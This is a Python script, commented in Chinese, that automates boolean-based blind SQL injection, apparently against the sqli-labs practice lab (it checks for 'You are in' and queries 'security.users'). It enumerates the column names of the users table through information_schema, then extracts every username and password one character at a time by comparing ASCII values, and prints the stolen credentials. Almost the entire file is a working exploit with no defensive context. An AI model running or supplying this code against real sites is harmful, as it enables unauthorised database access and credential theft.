import requests
# 表字段获取
colNum = 0
colName = []
url=''
# 以users表为例，获取表字段数量
while 1:
	url1 = url +"and exists(select column_name from information_schema.columns where table_name='users' limit "+str(colNum)+",1)--+"
	re = requests.get(url1)
	if 'You are in' in str(re.content):
		colNum = colNum + 1
	else:
		break
for i in range(colNum):
# 字段长度
	colLen = 0
	while 1:
		url1 = url + "and length((select column_name from information_schema.columns where table_name='users' limit "+str(i)+",1))="+str(colLen)+" --+"
		re = requests.get(url1)
		if 'You are in' in str(re.content):
			break
		else:
			colLen = colLen + 1
# 字段名称
	name = ''
	for colls in range(colLen):
		for asc in range(65,123):
			url1 = url + "and ascii(substr((select column_name from information_schema.columns where table_name='users' limit " + str(i) + ",1),"+str(colls+1)+",1) )="+str(asc)+" --+"
			re = requests.get(url1)
			if "You are in" in str(re.content):
				name = name + chr(asc)
				break
	colName.append(name)
# 数据记录的数量
dataNum = 0
while 1:
	url1 = url + "and exists(select id from security.users limit "+str(dataNum)+",1) --+"
	re = requests.get(url1)
	if 'You are in' in str(re.content):
		dataNum = dataNum + 1
	else:
		break
userName = []
passWord = []
for ndata in range(dataNum):
# 数据长度
	datals1 = 0
	datals2 = 0
	while 1:
		url1 = url + "and length((select username from security.users limit "+str(ndata)+",1))="+str(datals1)+" --+"
		re = requests.get(url1)
		if 'You are in' in str(re.content):
			break
		else:
			datals1 = datals1 + 1
	while 1:
		url2 = url + "and length((select password from security.users limit " + str(ndata) + ",1))=" + str(datals2) + " --+"
		re = requests.get(url2)
		if 'You are in' in str(re.content):
			break
		else:
			datals2 = datals2 + 1
# 数据内容
	user = ''
	pw = ''
	for ls1 in range(datals1):
		for asc in range(0, 128):
			url1 = url + "and ascii(substring((select username from security.users limit "+str(ndata)+",1),"+str(ls1+1)+",1))="+str(asc)+"--+"
			re = requests.get(url1)
			if 'You are in' in str(re.content):
				user = user + chr(asc)
				break
	userName.append(user)
	for ls2 in range(datals2):
		for asc in range(0, 128):
			url2 = url + "and ascii(substring((select password from security.users limit "+str(ndata)+",1),"+str(ls2+1)+",1))="+str(asc)+"--+"
			re = requests.get(url2)
			if 'You are in' in str(re.content):
				pw = pw + chr(asc)
				break
	passWord.append(pw)
# 数据输出
for i in range(len(userName)):
	print(i, ',用户名：', userName[i], '密码：', passWord[i])
